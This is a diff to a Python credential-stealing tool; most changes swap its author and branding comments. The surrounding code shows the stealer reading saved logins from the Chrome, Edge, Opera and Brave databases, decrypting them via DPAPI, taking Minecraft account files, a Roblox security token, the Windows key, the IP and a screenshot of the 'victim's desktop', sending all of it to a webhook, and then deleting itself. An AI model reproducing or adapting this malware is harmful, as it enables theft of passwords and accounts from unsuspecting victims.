@@ -19,8 +19,7 @@ import time
 from os import remove
 from sys import argv
 
-# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
-
+#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
 EBP = r'Microsoft\Edge\User Data\Default\Login Data'
@@ -28,7 +27,7 @@ MCBP = r'.minecraft\launcher_accounts.json'
 OBP = r'\Opera Software\Opera Stable'
 BBP = r'\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
 ADP = os.environ['LOCALAPPDATA']
-# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 
 def sniff(path):
@@ -85,7 +84,7 @@ def dpapi(encrypted):
     result = ctypes.string_at(blobout.pbData, blobout.cbData)
     ctypes.windll.kernel32.LocalFree(blobout.pbData)
     return result
-# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 
 def localdata():
@@ -151,7 +150,7 @@ class chrome:
         except WindowsError:
             return None
 
-# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def localdata2():
     jsn = None
@@ -216,7 +215,7 @@ class edge:
         except WindowsError:
             return None
 
-# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def localdata3():
     jsn = None
@@ -411,7 +410,7 @@ def beamed():
 
         message += '```'
     
-# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
     """screenshot victim's desktop"""
     try:
@@ -489,7 +488,7 @@ def beamed():
 
     """attempt to send all recieved data to our specified webhook"""
     try:
-        embedWIN = Embed(title=f' [  War\'s Beaming Tool => We Have Logged {user}  ] ',description=f'{user}\'s data was extracted and we have succesfully linked to {user}\'s computer, here\'s the details:',color=16316671,timestamp='now')
+        embedWIN = Embed(title=f' [  Gotcha!\'s Beaming Tool => We Have Logged {user}  ] ',description=f'{user}\'s data was extracted and we have succesfully linked to {user}\'s computer, here\'s the details:',color=16316671,timestamp='now')
         embedWIN.add_field("Windows Information:",f"WinType => {types}\nWinKey => {keys}\nEncryption =>  {el}\nManufacture => {sd}\nSerialNumber => {sn}")
         embedWIN.add_field("Location Information",f"IP => {hostname}")
         embedWIN.add_field("Roblox Security Token:",roblox)
@@ -536,6 +535,6 @@ def beamed():
         remove(argv[0])
     except:
     	pass
-# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 beamed()
